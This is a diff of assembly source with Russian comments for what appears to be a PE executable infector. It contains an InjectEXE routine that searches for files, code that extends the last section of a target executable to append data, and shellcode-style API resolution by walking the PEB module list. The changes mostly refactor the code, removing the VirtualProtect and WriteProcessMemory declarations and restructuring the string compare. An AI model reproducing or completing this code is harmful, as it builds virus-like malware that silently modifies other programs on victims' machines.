@@ -126,7 +126,6 @@ RvaToOffset proto CurrentStdcallNotation :cword, :cword
 
 DefineStdcallProto MessageBoxA, 4
 DefineStdcallProto VirtualProtect, 4
-DefineStdcallProto WriteProcessMemory, 5
 
 DefineStdcallProto CreateFileA, 7
 DefineStdcallProto GetFileSize, 2
@@ -141,8 +140,7 @@ DefineStdcallProto FindClose, 1
 
 DefineCProto memset
 DefineCProto memcpy
-DefineCProto strcpy
-
+;DefineCProto strcpy
 ;DefineCProto strlen
 ;DefineCProto printf
 
@@ -161,12 +159,10 @@ endif
 main proc
 local   pBase:cword
 local   pLoadLibraryA:cword
-local 	pVirtualProtect:cword
-local 	oldProtect:cword
 
     ; сохраняем базовый адрес
     mov [pBase], cbx
-
+	
     ; получаем адрес функции LoadLibraryA в kernel32.dll
     invoke FindProcAddressByName, addr [cbx + str_LoadLibraryA]
     mov [pLoadLibraryA], cax
@@ -174,12 +170,6 @@ local 	oldProtect:cword
 
     invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_Kernel32]
     invoke Stdcall1 ptr [pLoadLibraryA], addr [cbx + str_User32]
-	
-    ;invoke FindProcArray, addr [cbx + procNames], addr pVirtualProtect, 1
-	
-	; получаем права на запись в кодовой секции
-	;invoke Stdcall4 ptr [pVirtualProtect], cbx, endCode - start, PAGE_EXECUTE_READWRITE, addr oldProtect
-
 	
     invoke FindProcArray, addr [cbx + procNames], addr [cbx + procPointers], procNamesCount
 	
@@ -209,7 +199,7 @@ endif
 	ret
 main endp
 
-; инъекция то есть непосредственно
+; инъекция
 InjectEXE proc CurrentStdcallNotation
 	local hFindFile:HANDLE
 	local findData:WIN32_FIND_DATAA
@@ -447,8 +437,6 @@ ExtendLastSection proc CurrentStdcallNotation pe:cword, additionalSize:cword, rv
 	
 	pop cdx
 	sub cdx, cax
-	add cdx, 1000h ; чтоб VirtualProtect(addr,1000,...) в расширенном пространстве не попадал за пределы доступной памяти
-	invoke AlignToTop, cdx, [alignment]
 	mov cdx, cax
 	
 	mov cax, [pe]
@@ -463,10 +451,6 @@ ExtendLastSection proc CurrentStdcallNotation pe:cword, additionalSize:cword, rv
 	mov [cdx].IMAGE_SECTION_HEADER.SizeOfRawData, eax
 	
 	; lastSection->Misc.VirtualSize = newVirtualAndFileSize;
-	push cdx
-	add eax, 1000h
-	invoke AlignToTop, cax, [alignment]
-	pop cdx
 	mov [cdx].IMAGE_SECTION_HEADER.Misc.VirtualSize, eax
 	
 	;*rvaNewData = lastSection->VirtualAddress + offsetToNewSectionData;
@@ -494,13 +478,6 @@ FindProcArray proc stdcall uses cdi funcNames:ptr byte, funcAddress:ptr byte, fu
 
 local i:cword
 local funcName:cword
-    
-;ifdef _WIN64
-;	mov [rbp + 10h], rcx
-;	mov [rbp + 18h], rdx
-;	mov [rbp + 20h], r8
-;	mov [rbp + 28h], r9
-;endif
 	
     mov [i], 0
 
@@ -526,15 +503,12 @@ local funcName:cword
 
 FindProcArray endp
 
-;
-; функция сравнения ASCII-строк
-; bool CmpStr (char *str1, char *str2)
-;
-CmpStr:
+CmpStr proc stdcall str1:cword, str2:cword
+	
+	mov cax, [str1]
+	mov ccx, [str2]
 
-    mov cax, [csp+sizeof(cword)]
-    mov ccx, [csp+2*sizeof(cword)]
-@@:
+	@@:
     mov dl, [cax]
     cmp dl, byte ptr [ccx]
     jne ret_false
@@ -544,13 +518,12 @@ CmpStr:
     inc ccx
     jmp @b
 
-ret_false:
-    xor cax, cax
-
-    ; при равенстве строк возвращается адрес нулевого символа одной из строк
-    ; но главное, что ненулевое значение
-ret_true:
-    retn 2 * sizeof(cword)
+	ret_false:
+	    xor cax, cax
+		
+	ret_true:
+		ret
+CmpStr endp
 
 
 ;
@@ -558,13 +531,6 @@ ret_true:
 ; void * FindProcAddressByName (char * procName);
 ;
 FindProcAddressByName proc stdcall uses cdi cbx procName:ptr byte
-
-	;ifdef _WIN64
-	;	mov [rbp + 10h], rcx
-	;	mov [rbp + 18h], rdx
-	;	mov [rbp + 20h], r8
-	;	mov [rbp + 28h], r9
-	;endif
 
     assume cur_seg_reg:nothing
     mov cbx, [cur_seg_reg:OFFSET_PEB]       ; cbx = ptr _PEB
@@ -574,10 +540,12 @@ FindProcAddressByName proc stdcall uses cdi cbx procName:ptr byte
     mov cdi, cbx            ; cdi = голова списка
     mov cbx, [cbx]          ; cbx = InInitializationOrderModuleList.Flink
     .while cbx != cdi
-        push [procName]
-        push cword ptr [cbx+sizeof(CLIST_ENTRY)]    ; LDR_DATA_TABLE_ENTRY.DllBase
+        ;push [procName]
+        ;push cword ptr [cbx+sizeof(CLIST_ENTRY)]    ; LDR_DATA_TABLE_ENTRY.DllBase
                                     ; 10h - смещение от элемента InInitializationOrderLinks
-        call FindProcAddress
+        ;call FindProcAddress
+		
+		invoke FindProcAddress, cword ptr [cbx+sizeof(CLIST_ENTRY)], [procName]
         .if cax
             .break          ; в случае возврата cax будет содержать адрес функции
         .endif
@@ -631,10 +599,11 @@ local nameOcdinalsArray:cword
         mov cax, [namesArray]
         mov eax, [cax+cdi*sizeof(dword)]
         add cax, cbx
-        push [procName]
-        push cax
-        call CmpStr
-        test cax, cax
+        ;push [procName]
+        ;push cax
+        ;call CmpStr
+		invoke CmpStr, cax, [procName]
+		test cax, cax
         jne  @f
 
         inc edi
